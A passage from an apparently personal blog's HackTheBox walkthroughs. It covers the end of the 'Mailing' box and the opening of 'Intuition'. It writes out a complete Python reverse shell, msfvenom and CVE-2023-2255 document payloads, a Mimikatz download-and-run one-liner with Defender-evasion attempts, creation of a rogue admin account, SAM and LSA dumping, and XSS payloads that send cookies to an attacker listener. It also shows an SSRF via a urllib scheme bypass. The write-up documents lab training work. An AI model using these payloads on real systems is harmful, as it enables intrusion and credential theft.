Back in the hMailServer folder, it&rsquo;s also worth noting that PHPWebAdmin is not actually in-use. I know because the dist-config.php file is still present, and there is no config.php file, hence the system has not been initialized. Alright, enough fun&hellip; let&rsquo;s keep checking out the filesystem.
The Program Files folder:
All of those make sense for being there&hellip; except LibreOffice &#x1f914; Why is that there?
At first, I thought &ldquo;oh, it&rsquo;s just required for those VBScript files to run&rdquo;; but actually that&rsquo;s not true. I noticed back from C:\\Users\\maya that she has her own dotnet runtimes. So actually, LibreOffice isn&rsquo;t used at all on this box &#x1f440;
I went into the directory to see if there was anything else odd about this LibreOffice installation (maybe it has some weird scripts folder or something?) but it seemed pretty typical. Checking the C:\\Program Files\\LibreOffice\\readmes\\readme_en-US.txt file reveals that we&rsquo;re looking at LibreOffice 7.4.
LibreOffice I checked my own installation and I&rsquo;m running LIbreOffice 24.2.3 &#x1f610; Does this box have a totally ancient version installed?? I checked the official LibreOffice site to find out - it turns out that they had a big jump in their version numbering (7.6 -&gt; 24.x), but 7.4 is still an old version for sure. For the sake of checking if this is vulnerable to anything, I&rsquo;ll check the exact semantic version:
Get-ItemProperty -Path &#34;HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*&#34; | Where-Object { $_.DisplayName -like &#34;LibreOffice*&#34; } | Select-Object DisplayName, DisplayVersion That&rsquo;s good news for me: the above shows that it&rsquo;s the very first patch of a minor version (which means there might be unhandled regressions in the code).
LibreOffice is a proper, reputable open source project. As one might expect, they&rsquo;re very diligent about their security advisories. From this page, we can see what vulnerabilities the target&rsquo;s LibreOffice installation might have:
I looked into each of those CVEs. Here are the NVD entries for them:
CVE-2023-6186 (CVSS 8.8) Execute build-in macros without warning CVE-2023-6185 (CVSS 8.8) Execute arbitrary GStreamer plugins CVE-2023-2255 (CVSS 5.3) Craft a document to load external links without warning CVE-2023-0950 (CVSS 7.8) Arbitrary code execution via array underflow CVE-2022-3140 (CVSS 6.3) Execute arbitary scripts but requires user interaction For each of these CVEs, I googled &quot;CVE-202X-XXXX&quot; privilege escalation PoC&quot; to see if there were any that would be easy to check out. The first two had nothing&hellip; then I landed on that third one, which looked quite promising. There were a few PoCs written for it already.
&#x1f4a1; Remember that scheduled task we saw running as localadmin that executes soffice.ps1? It could be a coincidence, but maybe it&rsquo;s related to LibreOffice?
And if that&rsquo;s true, maybe it&rsquo;s doing something with that mysterious Important Documents folder.
I really don&rsquo;t like how much of this box is just sheer guessing and assumptions. It&rsquo;s really unpleasant so far &#x1f61e;
CVE-2023-2255 appears to be able to embed arbitrary shell commands within an LibreOffice document. Then, when that document is opened, the command will run under the same context as LibreOffice. I wonder if it would be possible to just open a reverse shell this way? &#x1f914; I should test it out first.
Reverse shell feasibility First, let&rsquo;s try opening a reverse shell just as maya. Windows Defender has been a real pain on this box, so I bet it will probably stop a reverse shell. Since we know the target has python, and maya can run python, I&rsquo;ll use a simple Python3 + Cmd reverse shell from revshells.com:
import os,socket,subprocess,threading; def s2p(s, p): while True: data = s.recv(1024) if len(data) &gt; 0: p.stdin.write(data) p.stdin.flush() def p2s(s, p): while True: s.send(p.stdout.read(1)) s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&#34;10.10.14.14&#34;,4444)) p=subprocess.Popen([&#34;cmd&#34;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE) s2p_thread = threading.Thread(target=s2p, args=[s, p]) s2p_thread.daemon = True s2p_thread.start() p2s_thread = threading.Thread(target=p2s, args=[s, p]) p2s_thread.daemon = True p2s_thread.start() try: p.wait() except KeyboardInterrupt: s.close() Saving that as revshell.py, I&rsquo;ll transfer it over to the target using SMB:
impacket-smbserver -smb2support -username &#39;kali&#39; -password &#39;testtesttest&#39; share . # Then, in a separate tab: sudo ufw allow from $RADDR to any port 4444 proto tcp bash rlwrap nc -lvnp 4444 C:\\net use x: \\\\10.10.14.14\\share /user:kali testtesttest cd C:\\Users\\maya\\Downloads copy X:\\revshell.py python revshell.py &#x1f389; It worked! Windows Defender did not stop the reverse shell! That means it can be used as a piece of privilege escalation.
CVE-2023-2255 Now that I know that a reverse shell might work for privesc, let&rsquo;s see if we can make it happen. Operating under the assumption that C\\Users\\localadmin\\Documents\\scripts\\soffice.ps1 (the scheduled task that localadmin runs) periodically reads files inside Important Documents, we might be able to turn this into privesc by crafting a document containing a malicious macro.
As mentioned earlier, I found some PoC code that claims it can encapsulate a program inside an ODT document by explioiting CVE-2023-2255. The PoC I found uses an exe payload, so I&rsquo;ll generate one using msfvenom:
&#x1f447; I checked the target&rsquo;s processor architecture first, by running $env::PROCESSOR_ARCHITECTURE.
git clone https://github.com/SaintMichae64/CVE-2023-2255.git cd CVE-2023-2255 msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f exe -o revshell.exe python3 exploit.py --output escalate.odt revshell.exe Note: I still have my nc listener running
impacket-smbclient maya:m4y4ngs4ri@mailing.htb &gt; use Important Documents &gt; put escalate.odt Then I waited&hellip; &#x1f91e;
&hellip; but no reverse shell &#x1f614;
Alright, I&rsquo;ll try it again, but with a different PoC script. This one seems less versatile, but has more stars on Github:
git clone https://github.com/elweth-sec/CVE-2023-2255.git cd CVE-2023-2255 python3 CVE-2023-2255.py --cmd &#39;python &#34;C:\\Important Documents\\revshell.py&#34;&#39; --output &#39;escalate2.odt&#39; cp escalate2.odt ../ I&rsquo;ve made a payload, test.odt that will automatically run the command python &quot;C:\\Important Documents\\revshell.py when escalate2.odt is opened. So, let&rsquo;s try placing escalate2.odt and revshell.py in that folder and see what happens:
impacket-smbclient maya:m4y4ngs4ri@mailing.htb &gt; use Important Documents &gt; put revshell.py &gt; put escalate2.odt Then I waited&hellip; &#x1f91e;&#x1f91e;
&hellip; and a reverse shell opened!
Finally, this worked, and I was able to type out the flag and be done with this wretched mess:
type root.txt EXTRA CREDIT: FULL PWN Getting Mimikatz I&rsquo;m really new to Windows post-exploitation stuff, but I know that a good way to get passwords or hashes from the SAM or LSASS is to use Mimikatz. However, we know that Windows Defender is running on this box and has been blocking all kinds of fun things from happening&hellip;
I read that a good way to bypass the AV is to run Mimikatz from memory. The way to do this is like this:
IEX (New-Object System.Net.Webclient).DownloadString(&#39;http://10.10.14.14:8000/Invoke-Mimikatz.ps1&#39;) Invoke-Mimikatz -DumpCreds Invoke-Mimikatz -Command &#39;&#34;privilege::debug&#34; &#34;token::elevate&#34; &#34;sekurlsa::logonpasswords&#34; &#34;lsadump::lsa /inject&#34; &#34;lsadump::sam&#34; &#34;lsadump::cache&#34; &#34;sekurlsa::ekeys&#34; &#34;exit&#34;&#39; (The above is from Hacktricks)
As expected, that didn&rsquo;t work. It failed at the first step, where Defender flagged the script as malicious. I tried renaming it, etc. No success:
Then I came across an article on BlackHills Infosec discussing how to easily obfuscate Mimikatz to bypass many AVs. I tried it out, and ultimately created another copy of Mimikatz called Invoke-Mimidogz.jpg, complete with many text substitutions within the script itself.
I tried transferring this via SMB, all to no avail:
net use x: \\\\10.10.14.14\\share /user:kali testtesttest copy X:\\Invoke-Mimikatz.ps1 # Initial file, from github copy X:\\Invoke-Mimidogz.ps1 # Renamed only copy X:\\Invoke-Mimidogz-obf.ps1 # With all obfuscation substitutions from the BlackHills article copy X:\\Invoke-Mimidogz.jpg # Same as above, but with a different extension Each attempt was met with Defender blocking the file transfer:
I&rsquo;m sure it&rsquo;s possible to do this, but not with my level of skill &#x1f605;
Dump the SAM No problem, I still have another idea. I know that crackmapexec is able to dump the SAM to obtain hashes.
But why not try this first, before Mimikatz?
Well, this technique requires valid admin credentials, and all I have is an admin reverse shell. So how can we turn this into credentials? The obvious choice is to make Maya an administrator, but this would spoil the box for whomever else is currently attacking it. So I think the trick will be to create a new user instead.
From the localadmin account, we can create a new user with known credentials:
New-LocalUser -Name &#34;jimbob&#34; -Password (ConvertTo-SecureString -AsPlainText &#34;soaringPheasant987&#34; -Force) -FullName &#34;Jimbob Bobjim&#34; -Description &#34;Bobjim the adnim&#34; -AccountNeverExpires It seems like it worked perfectly:
It looks like it&rsquo;s &ldquo;Administrador&rdquo;, but I&rsquo;ll verify what the local administrators group is:
Get-LocalGroup -SID &#34;S-1-5-32-544&#34; Aha! OK. It&rsquo;s &ldquo;Administradores&rdquo;
So now let&rsquo;s put jimbob into the Administradores group:
Add-LocalGroupMember -Group &#34;Administradores&#34; -Member &#34;jimbob&#34; Or equivalently in cmd:
net localgroup Administradores jimbob /add Great, that seems like it had the desired effect!
We now have an account on the machine with a known credential: jimbob : soaringPheasant987.
Since jimbob is an administrator, I should have full access to SMB. Let&rsquo;s try that out:
Yep! Works perfectly. Note that we can access the protected ADMIN$ share now.
Since we have admin access to SMB, it should be trivial to dump the SAM using crackmapexec:
crackmapexec smb $RADDR -u &#39;jimbob&#39; -p &#39;soaringPheasant987&#39; --sam Aside from passing-the-hash (which we could do with Evil-WinRM), we can also crack these hashes. I didn&rsquo;t have a very good understanding of this, but found this video from Hackersploit very helpful:
We can crack the NTLM hashes as follows (note that I&rsquo;m artificially inserting my known password into the wordlist):
cp /usr/share/wordlists/rockyou.txt . echo &#34;soaringPheasant987&#34; &gt;&gt; ./rockyou.txt john --wordlist=rockyou.txt SAM_hashes.txt --format=NT -pot=mailing.pot We can also get the LSA secrets in the same way, using crackmapexec in SMB mode:
crackmapexec smb $RADDR -u &#39;jimbob&#39; -p &#39;soaringPheasant987&#39; --lsa CLEANUP Target I need to get rid of the reverse shell that I used:
rm C:\\Users\\maya\\Downloads\\revshell.py I also need to remove the extra user I added to the box. I&rsquo;ll do this from the localadmin reverse shell:
Remove-LocalUser -Name &#34;jimbob&#34; Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space:
rm loot/rockyou.txt It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; LESSONS LEARNED Attacker &#x1f465; Be generous with your list of usernames. Sometimes very small hints will let you know the username to try. On this box, for some time I was fixated on trying to login to the email of either ruy or maya, because those were the confirmed accounts I had seen. However, the hMailServer.ini file hinted at some &ldquo;Administrator&rdquo; account - it wasn&rsquo;t until later that I tried administrator for accessing email.
&#x1f503; Sometimes, induction is the way. It sucks. It really sucks. But sometimes you just need to make wild assumptions and carry out your idea to completion, and only then will you know if your initial assumption was correct.
&#x1f608; Once you have local admin, everything is possible. On Windows, once you&rsquo;ve completed a little bit of privilege escalation, the world is your oyster. Take the hashes, make new accounts, cover your tracks, do whatever!
Defender &#x1f4cf; Password length doesn&rsquo;t matter if the password is still easily guessable. On this box, we cracked the administrator password in about 1s, even though it was 27 characters long. If the password is easily guessable and exists in wordlists like rockyou, no amount of special characters, digits, or capitals will help - they are all the same level of complexity if the password is subject to a simple dictionary attack.
&#x1f525; Windows is a dumpster fire. Don&rsquo;t use it. I&rsquo;m really glad I&rsquo;m not the administrator of some large sprawling Windows-based ecosystem. It seems like it&rsquo;s basically impossible to secure it properly. All you can really do is make things incrementally harder for attackers.
`,url:"https://4wayhandshake.github.io/walkthrough/mailing/"},"https://4wayhandshake.github.io/walkthrough/intuition/":{title:"Intuition",tags:["XSS","SSRF","SSH Key Management","Password Cracking","Brute-forcing","Log Analysis","Reverse Engineering","Command Injection"],categories:["Walkthrough","HTB","Linux","Hard"],content:`INTRODUCTION I hope that Runner got you warmed up for HTB&rsquo;s Season 5, Anomalies&hellip; because you&rsquo;re going to need it - this one is tough! Intuition was released as the second box of the season, requiring a wide array of skills to complete. Intuition is very long: by my count, it has ten distinct steps to overcome (which classifies it as being on the harder end of &ldquo;hard&rdquo; difficulty). Interestingly though, Intuition requires very little in terms of &ldquo;exploitation&rdquo;; it&rsquo;s mostly about finding and abusing simple misconfigurations/mistakes - which, I think, makes it a more realistic scenario than many HTB boxes.
Recon is fairly easy - nothing is really hidden. After discovering a few subdomains, foothold begins. The foothold on this box was a real treat, though, taking place over two distinct stages. First we get to play around with a little XSS, stealing one of the dev&rsquo;s cookies and using it to log into their dashboard. From there, we find a way to leverage our new position as a &ldquo;dev&rdquo; to XSS an administrator&rsquo;s cookie, which gets us into a more privileged version of the dashboard, where the hunt for the User flag can begin.
That more privileged dashboard, with a little bit of research, has an easy-to-use SSRF (some might just consider it an LFI) with which we can read arbitrary files. A little bit of poking around with the SSRF yields us access to an FTP server and from there (with a little key-management trick) our first actual shell on the box, yielding the first flag.
The pathway to the root flag was pretty rough, and not entirely linear either. Staying methodical with enumeration is a huge asset for this one. You&rsquo;ll need to analyze some source code, do some hash cracking, perform some customized brute-forcing, locate and parse some pretty mega log files&hellip; and by then all you&rsquo;ve accomplished is moving laterally to the second user &#x1f602;
Privilege escalation begins in earnest with that second user, who has some sudo privileges and access to a poorly-written tool. This was a very approachable challenge of reverse engineering skills. You&rsquo;ll need to carefully analyze a binary to figure out exactly how to access its vulnerable code. Once figuring out how to access that code, you&rsquo;ll still need to figure out how to use that code to deliver your final payload.
Overall, Intuition is a fantastic reminder about the human element behind web-based systems, and that even simple misconfigurations can have grave consequences.
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA) |_ 256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://comprezzor.htb/ Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 5.0 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Vuln scan I ran a vuln scan, but there were no results:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR UDP scan I also ran a UDP scan for the top 100 ports, but also no results:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR Webserver Strategy Noting the redirect from the nmap scan, I added comprezzor.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=comprezzor.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v There were no results while enumering vhosts at the root level ([anything].htb). Now I&rsquo;ll check for subdomains of the known domain, comprezzor.htb:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o &#34;fuzzing/vhost-$DOMAIN.md&#34; -of md -timeout 4 -ic -ac -v There were a few results:
I&rsquo;ll move on to directory enumeration of each of the subdomains we just found:
echo &#34;$RADDR auth.$DOMAIN&#34; | sudo tee -a /etc/hosts; echo &#34;$RADDR dashboard.$DOMAIN&#34; | sudo tee -a /etc/hosts; echo &#34;$RADDR report.$DOMAIN&#34; | sudo tee -a /etc/hosts; WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; for SUBD in auth dashboard report; do ffuf -w $WLIST:FUZZ -u http://$SUBD.$DOMAIN/FUZZ -t 80 -c -o ffuf-directories-$SUBD -of json -e .php,.js,.html -timeout 4 -v; done; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 -c -o ffuf-directories-root -of json -e .php,.js,.html -timeout 4 -v; There were a few pages at auth.comprezzor.htb:
At dashboard.comprezzor.htb there is some backup directory:
I&rsquo;m a little skeptical that dashboard only has one page / directory. I decided to recheck this, digging a lot deeper this time:
WLIST=/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt; ffuf -w $WLIST:FUZZ -u http://dashboard.$DOMAIN/FUZZ -t 80 -c -ic -timeout 4 -v; Ok, so I found one extra page: /resolve. This suggests that maybe the bug reports are resolved through that page? i.e. dashboard is for developers and administrators to use?
Exploring the Website The index page at http://comprezzor.htb shows a tool to compress files. There is some frontend validation to only allow txt, pdf, and docx.
I tried submitting a txt file. Indeed, the site returned a download for my compressed file. I examined the compressed file using binwalk:
I should come back here later and investigate insecure file upload vulnerabilities &#x1f6a9;
Checking out the subdomain auth.comprezzor.htb, I tried registering an account and logging in. My creds were jimbob : password1:
Logging in from here redirects us to report.comprezzor.htb. The page hints that there is some kind of prize for bug submissions. There are links to report.comprezzor.htb/about_reports and report.comprezzor.htb/report_bug:
After logging in, I have a single cookie: user_data. Decoding it as base64 shows something interesting:
&#x1f914; The part after the pipe | character looks like a SHA256 sum&hellip; Perhaps it&rsquo;s a hash of the json data? And if so, there&rsquo;s a chance that this data is only stored client-side and is a trusted, controllable input. Perhaps I can assign myself a different role and provide a hash that matches it? I&rsquo;ll have to come back and investigate this later &#x1f6a9;
Edit: I now have confirmation of this mechanism.
Somebody reset the box: when I refreshed the page, I was still logged-in and could continue navigating around the site with my old credential. That means that the user_data cookie is only validated by the hash, which is also stored client-side!
The /about_reports page shows some very juicy hints:
At Comprezzor, we take bug reports seriously. Our dedicated team of developers diligently examines each bug report and strives to provide timely solutions to enhance your experience with our services.
How Bug Reports Are Handled:
Every reported bug is carefully reviewed by our skilled developers. If a bug requires further attention, it will be escalated to our administrators for resolution. &hellip;
&#x1f600; Alright! If developers will be diligently examining my bug reports, maybe I can grab their cookie using some XSS?
FOOTHOLD XSS - Bug Report First, we need to investigate this suspected XSS. If it does exist, it will be delivered when the web dev or administrator opens the bug report - that means that this will be a blind XSS. I&rsquo;ll set up a listener for incoming requests:
For this, I&rsquo;m using one of my own tools: simple-http-server. It&rsquo;s just an extension of the known and loved python http.server, but with a few additions:
it also handles POSTs and file uploads nicely. In verbose mode it will show the full request headers. It will base-64 decode any data sent to it as the b64 parameter. Feel free to try it out, if you want! There are many better tools out there already, but this one is mine &#x2764;&#xfe0f;
sudo ufw allow from $RADDR to any port 8000 proto tcp simple-server 8000 -v Now that the listener is running, I&rsquo;ll try an XSS payload inside each of the fields of the form, labelling which is which within the request:
Bug found - urgent attention required! &lt;script src=&#39;http://10.10.14.9:8000?field=title&#39;&gt;&lt;/script&gt; You are vulnerable to the xz backdoor. Patch immediately! &lt;script src=&#39;http://10.10.14.9:8000?field=description&#39;&gt;&lt;/script&gt; I clicked the Submit Bug Report button. After about 30s I saw a request come in:
Fantastic! Both fields are vulnerable to XSS. Plus, it looks like there&rsquo;s some kind of automated &ldquo;person&rdquo; running on the server to read all my XSS payloads (The user-agent is the geckodriver).
Now that I know both fields are vulnerable, let&rsquo;s try to get that cookie. I&rsquo;ll try a few payloads all together:
Moments later, the requests came in to my listener:
Nice - we got a web dev&rsquo;s cookie. Plus, we know the payload that worked was this:
&lt;script&gt;document.location=&#39;http://10.10.14.9:8000/documentlocation?b64=&#39;+document.cookie.slice(10,)&lt;/script&gt; &#x1f605; i.e the really simple payload&hellip; Keep it simple, stupid!
The cookie we received was the GET parameter:
eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4, which decodes to the following:
{&#34;user_id&#34;: 2, &#34;username&#34;: &#34;adam&#34;, &#34;role&#34;: &#34;webdev&#34;}|58f6f725339ce3f69d8552a10696ddebb68b2b57d2e523c08bde868d3a756db8 I&rsquo;ll try overwriting my cookie with theirs, and checking out the dashboard.comprezzor.htb subdomain.
Hmm&hellip; given the title, I get the feeling this isn&rsquo;t the &ldquo;admin&rdquo; dashboard. However, we already got a hint about that: according to the text on report.comprezzor.htb/about_reports, we know that we can get an admin to look at the bug report if we escalate it:
&hellip;If a bug requires further attention, it will be escalated to our administrators for resolution&hellip;
Aha! I see how we might do that. Checking out report 5 reveals that, as a &ldquo;web dev&rdquo; we can change the priority of a report:
I&rsquo;ll just need to submit a bug report, check it&rsquo;s report_id, then POST /change_priority?report_id=[X]&amp;priority_level=1. The other reports have IDs 1 through 5, so I think I&rsquo;m safe to assume mine will be 6 (the box keeps resetting &#x1f440; )
watch -c -n 5 \\ curl -X POST \\ -b &#39;user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4&#39; \\ http://dashboard.comprezzor.htb/change_priority?report_id=6&amp;priority_level=1 With a little luck, that should escalate the report I submit within 5 seconds, and an admin will have to view it. Hopefully then, I&rsquo;ll have an admin user&rsquo;s cookie.
XSS - Admin User &hellip; and that seemed like a fine plan, until I saw someone else&rsquo;s XSS attempt arrive &#x1f605;
Clearly, the report_id will not have the assumed value of 6. That&rsquo;s fine, I&rsquo;ll just open two browser windows; I&rsquo;ll submit the report (containing XSS) in one, and escalate it in the other. I&rsquo;ll submit the successful payload from earlier:
Checking the dashboard again, we see the report arrive:
Now we can escalate using a cURL request:
curl -X POST -b &#39;user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4&#39; &#39;http://dashboard.comprezzor.htb/change_priority?report_id=26&amp;priority_level=1&#39; The escalation seems to be successful.
I never received a request to my XSS listener&hellip; &#x1f613; I&rsquo;m going to reset the box again.
YEP! That&rsquo;s all it took &#x1f4a2;
&#x1f44f; Within a minute or so, I received the admin cookie at my XSS listener:
For copy-pasting, that admin cookie is: eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
{&#34;user_id&#34;: 1, &#34;username&#34;: &#34;admin&#34;, &#34;role&#34;: &#34;admin&#34;}|34822333d444ae0e4022f6cc679ac9d26d1d1d682c59c61cfbea29d776d589d9 I&rsquo;ll swap out my cookie in the same way as before, directly in my browser, then navigate to dashboard.comprezzor.htb and see if anything is different.
&#x1f601; Nice! We&rsquo;re in to the admin dashboard now.
Admin Dashboard Taking a look around the dashboard, there are are a couple new options here:
Create a backup uses the endpoint discovered earlier during directory enumeration: dashboard.comprezzor.htb/backup Create PDF Report: uses an endpoint not previously seen: dashboard.comprezzor.htb/create_pdf_report Create a backup At first glance, Create a backup doesn&rsquo;t seem to do much.
I proxied the request through ZAP and found it was setting a session cookie. However, decoding the cookie at https://jwt.io reveals that it was only for the toast that appeared:
Create PDF Report I&rsquo;ll try using this feature in the way that, seemingly, it was intended:
But this simply yields an error message: &ldquo;Invalid URL&rdquo;.
To investigate this, I tried providing the URL of my local, formerly-XSS listener, webserver: http://10.10.14.9:8000. When submitting that, I get a different error message: &ldquo;Unexpected error!&rdquo;. That&rsquo;s odd, because the request came through to the listener and was given an HTTP 200 status&hellip;
However, from this request back to my http server, I can see from the User-Agent that the target is running Python 3.11, probabably a Flask server, and using urllib.
I&rsquo;m starting to wonder why I can&rsquo;t even get this thing to work when I provide a seemingly valid URL&hellip; To verify if the validation is occurring client-side or server-side, I&rsquo;ll simply remove the &lt;input&gt; type, and thereby its automatic validation.
However, when I try to generate the report for http://dashboard.comprezzor.htb/report/4 again, still the same result: &ldquo;Invalid URL&rdquo;. That confirms that the validation is happening server-side, but I don&rsquo;t yet know the details of it.
We already know from the User-Agent that the target is using urllib. So, to learn more, I checked the official documentation of urllib.parse. From this, I learned two main things:
There are lots of URL schemes that I could try, not just http. It can use schemes including file, svn, ftp and even more exotic ones like gopher. The scheme of the URL is introduced by the // characters, which are considered safe characters and probably don&rsquo;t need to be bypassed. To try to find examples of urllib.parse in action, I did a DuckDuckGo search for &ldquo;python 3.11 urllib parse&rdquo;. Much to my surprise, near the bottom of the first page of results there was a CVE listed - and it&rsquo;s a recent one! &#x1f911;
Investigating a little further, I found this helpful article describing the vulnerability.
Apparently, there is a bug in some versions of urllib that allow the URL scheme validation to be bypassed. If the developer didn&rsquo;t know about this, when using urllib.parse to read a URL, they may have set up a deny-list of specific to the scheme attribute of the URL (much better option would have been to use a &ldquo;contains&rdquo;-style regex). These vulnerable versions of urllib will happily accept whitespace at the beginning of the scheme attribute, rendering ineffective any protection based on a deny-list!
Let&rsquo;s try it out (I&rsquo;ve highlighted the space character to show that it&rsquo;s there):
And&hellip; it works like a charm! The server offered a download of the &ldquo;report&rdquo; PDF:
PDF Report SSRF The good news is that we can leak files. The bad news is that we&rsquo;re clearly in a container (known because only the root user is shown in /etc/passwd)
I can also leak /etc/shadow, but there are no password hashes inside - further evidence that we are in a container.
Since it&rsquo;s a container, maybe there are some useful environment variables set? I&rsquo;ll check /proc/self/environ:
HOSTNAME=web.localPYTHON_PIP_VERSION=22.3.1HOME=/rootGPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696DPYTHON_GET_PIP_URL=https://github.com/pypa/get- pip/raw/d5cb0afaf23b8520f1bbcfed521017b4a95f5c01/public/get-pip.pyPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binLANG=C.UTF- 8PYTHON_VERSION=3.11.2PYTHON_SETUPTOOLS_VERSION=65.5.1PWD=/appPYTHON_GET_PIP_SHA256=394be00f13fa1b9aaa47e911bdb59a09c3b2986472130f30aa0bfaf7f3980637 From this we can confirm a couple important details:
Target is running Python 3.11.2 The server is running in /app, with hostname web.local Let&rsquo;s keep enumerating the process. We can check /proc/self/cmdline to see how the web app was executed:
In other words, we now know the web app was ran from /app, using something that looked like this:
python3 /app/code/app.py Great, now we have an exact filepath for the web app. Let&rsquo;s take a look-see: file:///app/code/app.py
This gets us some really important details:
app.secret_key is 7ASS7ADA8RF3FD7
Confirmation that the web app is using Flask
Relative paths to the code for each subdomain:
./blueprints/index/index.py is comprezzor.htb ./blueprints/report/report.py is report.comprezzor.htb ./blueprints/auth/auth.py is auth.comprezzor.htb ./blueprints/dashboard/dashboard.py is dashboard.comprezzor.htb USER FLAG Reading the source code To read the web app&rsquo;s source code in its entirety, I should be able to get the files for each subdomain:
/app/code/app.py /app/code/blueprints/index/index.py /app/code/blueprints/report/report.py /app/code/blueprints/auth/auth.py /app/code/blueprints/dashboard/dashboard.py &#x1f605; And I get the super fun task of formatting all this python code&hellip; yay!
Here&rsquo;s app.py:
from flask import Flask, request, redirect from blueprints.index.index import main_bp from blueprints.report.report import report_bp from blueprints.auth.auth import auth_bp from blueprints.dashboard.dashboard import dashboard_bp app = Flask(__name__) app.secret_key = &#34;7ASS7ADA8RF3FD7&#34; app.config[&#39;SERVER_NAME&#39;] = &#39;comprezzor.htb&#39; app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 5 * 1024 * 1024 # Limit file size to 5MB ALLOWED_EXTENSIONS = {&#39;txt&#39;, &#39;pdf&#39;, &#39;docx&#39;} # Add more allowed file extensions if needed app.register_blueprint(main_bp) app.register_blueprint(report_bp, subdomain=&#39;report&#39;) app.register_blueprint(auth_bp, subdomain=&#39;auth&#39;) app.register_blueprint(dashboard_bp, subdomain=&#39;dashboard&#39;) if __name__ == &#39;__main__&#39;: app.run(debug=False, host=&#34;0.0.0.0&#34;, port=80) This is index.py, or at least pretty similar to it:
